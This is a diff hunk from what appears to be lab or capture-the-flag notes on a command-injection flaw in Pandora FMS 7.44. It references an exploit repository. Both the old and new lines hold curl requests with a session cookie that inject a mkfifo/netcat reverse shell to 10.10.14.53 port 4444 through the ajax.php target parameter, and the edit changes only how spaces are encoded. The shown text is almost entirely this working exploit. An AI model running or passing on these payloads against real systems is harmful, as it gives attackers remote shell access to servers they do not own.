@@ -141,12 +141,12 @@ Vulnerable to:
 https://github.com/hadrian3689/pandorafms_7.44
 
 ```
-curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "http://localhost/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"
+curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "http://localhost/pandora_console/ajax.php?page=include/ajax/events&perform_event_response=10000000&target=mkfifo /tmp/f%3B nc 10.10.14.53 4444 0%3C/tmp/f%7C/bin/sh - 2%3E%261%7Ctee /tmp/f&response_id=1"
 ```
 or
 ```
 URL="http://localhost/pandora_console/ajax.php"
-PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo%20/tmp/f%3B%20nc%2010.10.14.53%204444%200%3C/tmp/f%7C/bin/sh%20-%202%3E%261%7Ctee%20/tmp/f&response_id=1"
+PARAMS="page=include/ajax/events&perform_event_response=10000000&target=mkfifo /tmp/f%3B nc 10.10.14.53 4444 0%3C/tmp/f%7C/bin/sh - 2%3E%261%7Ctee /tmp/f&response_id=1"
 
 curl -H "Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" "${URL}?${PARAMS}"
 ```
